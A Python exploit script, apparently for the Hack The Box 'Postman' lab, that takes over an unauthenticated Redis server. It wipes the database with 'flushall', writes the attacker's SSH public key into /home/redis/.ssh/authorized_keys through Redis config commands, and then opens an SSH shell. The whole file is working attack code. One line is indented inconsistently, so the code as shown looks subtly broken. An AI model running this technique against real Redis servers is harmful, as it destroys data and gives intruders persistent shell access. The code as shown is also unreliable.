#!/usr/bin/python
# origin code by Acid
# exploit i used to get the initial shell on POSTMAN machine from HTB

import os
import os.path
from sys import argv

ip_address = "10.10.10.160"
username = "redis"

PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'

def spawn():
	ssh = "ssh -i " + '$HOME/.ssh/id_rsa redis@10.10.10.160'
	os.system(ssh)

if os.path.isfile(PATH) or os.path.isfile(PATH1):
	try:
    os.system('ssh-keygen -q -t rsa -C \"acid_creative\"')
		print("\t Keys Generated Successfully")
		os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
		cmd = "redis-cli -h 10.10.10.160 flushall"
		cmd1 = "redis-cli -h 10.10.10.160 "
		os.system(cmd)
		cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h 10.10.10.160 -x set cracklist"
		os.system(cmd2)
		cmd3 = cmd1 + ' config set dbfilename "backup.db" '
		cmd4 = cmd1 + ' config set  dir' + " /home/redis/.ssh/"
		cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
		cmd6 = cmd1 + ' save'
		os.system(cmd3)
		os.system(cmd4)
		os.system(cmd5)
		os.system(cmd6)
		spawn()

	except:
		print("just retry, it will work after multiple retry..")
else:
	print ("\t Redis-cli : This utility is not installed..")
